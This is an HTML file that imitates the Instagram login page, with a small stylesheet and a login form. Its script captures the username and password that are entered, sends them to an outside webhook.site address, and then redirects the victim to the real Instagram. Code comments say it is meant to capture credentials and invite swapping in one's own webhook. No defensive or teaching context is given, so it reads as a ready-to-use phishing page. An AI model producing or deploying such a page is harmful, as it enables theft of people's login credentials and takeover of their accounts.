<!DOCTYPE html>
     <html lang="en">
     <head>
         <meta charset="UTF-8">
         <meta name="viewport" content="width=device-width, initial-scale=1.0">
         <title>Instagram</title>
         <style>
             body { font-family: Arial, sans-serif; background-color: #fafafa; }
             .container { max-width: 350px; margin: 100px auto; padding: 20px; border: 1px solid #ccc; background-color: #fff; }
             input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 3px; }
             button { width: 100%; padding: 10px; background-color: #3897f0; color: #fff; border: none; border-radius: 3px; }
         </style>
     </head>
     <body>
         <div class="container">
             <h2>Instagram</h2>
             <form id="loginForm">
                 <input type="text" id="username" placeholder="Phone number, username, or email" required>
                 <input type="password" id="password" placeholder="Password" required>
                 <button type="submit">Log In</button>
             </form>
         </div>
         <script>
       document.getElementById('loginForm').addEventListener('submit', function(event) {
         event.preventDefault();
         const username = document.getElementById('username').value;
         const password = document.getElementById('password').value;
         
         // Replace with your webhook URL
         const webhookURL = 'https://webhook.site/c7b3dda1-59f6-4b6b-ae50-80dc22a821f4';
         
         // Send data to the webhook
         fetch(webhookURL, {
           method: 'POST',
           headers: {
             'Content-Type': 'application/json',
           },
           body: JSON.stringify({
             username: username,
             password: password,
           }),
         })
         .then(response => {
           if (response.ok) {
             // Redirect to real Instagram after capturing credentials
             window.location.href = 'https://www.instagram.com';
           }
         })
         .catch(error => {
           console.error('Error:', error);
         });
       });
         </script>
     </body>
     </html>
